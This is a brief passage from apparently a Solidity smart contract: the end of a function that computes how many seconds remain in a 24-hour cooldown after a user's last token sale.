        return ((timestamp - map_Users[userAddress].LastTokenSellTimestamp) >= 86400) ? 0 : (map_Users[userAddress].LastTokenSellTimestamp + 86400 - timestamp);
    }
}
